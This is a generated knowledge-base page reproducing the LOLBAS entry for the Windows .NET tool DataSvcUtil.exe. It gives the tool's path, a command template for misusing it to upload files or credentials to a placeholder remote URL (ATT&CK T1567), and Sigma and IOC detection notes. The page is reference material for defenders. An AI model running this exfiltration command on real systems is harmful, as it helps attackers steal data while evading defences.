---
title: "DataSvcUtil.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/DataSvcUtil.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "DataSvcUtil.exe"
functions:
  - "Upload"
attack_technique_ids:
  - "T1567"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# DataSvcUtil.exe

DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.

## Metadata

- Category: OSBinaries
- Created: 2020-12-01
- Author: Ialle Teixeira
- Source Path: yml/OSBinaries/DataSvcUtil.yml

## Paths

- `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`

## Commands

### 1. Upload

Upload file, credentials or data exfiltration in general

```cmd
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
```

- Use Case: Upload file
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
- IOC: The DataSvcUtil.exe tool is installed in the .NET Framework directory.
- IOC: Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.

## Resources

- {'Link': 'https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe'}
- {'Link': 'https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services'}
- {'Link': 'https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services'}

## Acknowledgements

- {'Person': 'Ialle Teixeira', 'Handle': '@NtSetDefault'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml)
